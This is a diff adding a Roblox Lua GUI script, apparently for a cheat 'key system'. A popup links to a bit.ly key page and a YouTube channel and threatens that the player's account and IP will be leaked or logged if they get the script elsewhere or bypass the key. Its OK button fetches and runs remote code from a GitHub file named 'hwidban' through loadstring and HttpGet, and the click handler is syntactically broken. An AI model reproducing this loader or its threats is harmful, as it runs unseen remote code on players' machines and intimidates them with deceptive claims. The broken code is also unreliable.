@@ -1,0 +1,58 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Screen1 = Instance.new("ScreenGui")
+local WARN = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Label = Instance.new("TextLabel")
+local load = Instance.new("TextButton")
+
+--Properties:
+
+Screen1.Name = "Screen1"
+Screen1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Screen1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+WARN.Name = "WARN"
+WARN.Parent = Screen1
+WARN.BackgroundColor3 = Color3.fromRGB(83, 255, 132)
+WARN.Position = UDim2.new(0.317590714, 0, 0.187654316, 0)
+WARN.Size = UDim2.new(0, 503, 0, 352)
+
+UICorner.Parent = WARN
+
+Label.Name = "Label"
+Label.Parent = WARN
+Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Label.BackgroundTransparency = 1.000
+Label.Position = UDim2.new(0.186878726, 0, 0.0653409064, 0)
+Label.Size = UDim2.new(0, 345, 0, 212)
+Label.Font = Enum.Font.SourceSans
+Label.Text = "Link to get the key: https://bit.ly/SecurityWindowKeySystem   --if u click ok it load script and after u click it make sure u got from thecheater official channel https://youtube.com/@thecheaternicescript or the roblox script discord official otherwise your account and ip will be leaked, dont try to bypass the key because it will give u a wrong key also your ip will be logged so i dont recommend it"
+Label.TextColor3 = Color3.fromRGB(0, 0, 0)
+Label.TextScaled = true
+Label.TextSize = 55.000
+Label.TextWrapped = true
+
+load.Name = "load"
+load.Parent = WARN
+load.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+load.Position = UDim2.new(0.343936384, 0, 0.667613626, 0)
+load.Size = UDim2.new(0, 200, 0, 50)
+load.Font = Enum.Font.SourceSans
+load.Text = "OK"
+load.TextColor3 = Color3.fromRGB(0, 0, 0)
+load.TextSize = 14.000
+
+-- Scripts:
+
+local function GTUWAB_fake_script() -- load.LocalScript 
+	local script = Instance.new('LocalScript', load)
+
+	script.Parent.MouseButton1Click:Connect(function)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TheCheaterNiceScripts/RobloxHWID/main/hwidban", true))()
+	end)
+end
+coroutine.wrap(GTUWAB_fake_script)()
